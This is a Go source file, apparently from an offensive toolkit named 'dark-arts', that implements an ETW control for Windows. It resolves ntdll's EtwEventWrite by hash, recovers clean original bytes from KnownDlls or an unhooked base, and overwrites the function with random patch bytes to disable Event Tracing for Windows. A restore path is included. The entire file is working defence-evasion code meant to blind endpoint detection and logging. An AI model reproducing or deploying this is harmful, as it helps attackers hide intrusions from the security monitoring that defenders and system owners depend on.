//go:build windows && amd64

package securityctl

import (
	"fmt"

	"dark-arts/pkg/evasion"
)

type ETWControl struct {
	baseControl
	fp *funcPatch
}

func NewETWControl() *ETWControl {
	return &ETWControl{baseControl: newBaseControl("etw")}
}

func (e *ETWControl) Initialize() error {
	fp, err := resolveFuncByHash("ntdll.dll", "EtwEventWrite")
	if err != nil {
		return e.markInitialized(fmt.Errorf("securityctl: etw: resolve: %w", err))
	}

	knownDllFP, kerr := resolveFuncFromKnownDlls("ntdll.dll", "EtwEventWrite")
	if kerr == nil && knownDllFP != nil {
		fp.orig = knownDllFP.orig
	}

	cleanBase, cerr := evasion.DiagCleanBase()
	if cerr == nil && cleanBase != 0 {
		cleanFP, err := resolveFuncFromBase(cleanBase, "EtwEventWrite")
		if err == nil && cleanFP != nil {
			fp.orig = cleanFP.orig
		}
	}

	e.fp = fp
	return e.markInitialized(nil)
}

func (e *ETWControl) Enable() error {
	if err := e.markEnabled(); err != nil {
		return err
	}
	if e.fp == nil {
		e.markDisabled()
		return fmt.Errorf("securityctl: etw: not initialized")
	}
	e.fp.patch = randomPatchBytes()
	if err := applyPatch(e.fp); err != nil {
		e.markDisabled()
		return err
	}
	return nil
}

func (e *ETWControl) Disable() error {
	if e.fp == nil {
		e.markDisabled()
		return nil
	}
	if err := restorePatch(e.fp); err != nil {
		return err
	}
	e.markDisabled()
	return nil
}

func (e *ETWControl) Restore() {
	if e.fp == nil {
		return
	}
	_ = restorePatch(e.fp)
}
